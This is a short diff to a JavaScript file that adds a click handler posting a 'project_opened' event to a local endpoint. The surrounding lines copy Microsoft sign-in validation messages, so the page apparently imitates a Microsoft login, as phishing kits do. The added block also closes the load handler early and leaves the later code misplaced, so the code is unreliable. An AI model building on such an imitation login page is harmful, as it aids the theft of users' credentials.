@@ -1,4 +1,24 @@
 document.addEventListener('DOMContentLoaded', () => {
+     const projectButton = document.getElementById('project_button');
+
+    if (projectButton) {
+        projectButton.addEventListener('click', async () => {
+            try {
+                await fetch('/project-opened', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        event: 'project_opened'
+                    })
+                });
+            } catch (error) {
+                console.error('Notification error:', error);
+            }
+        });
+    }
+});
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
     const unameInp = document.getElementById('inp_uname');
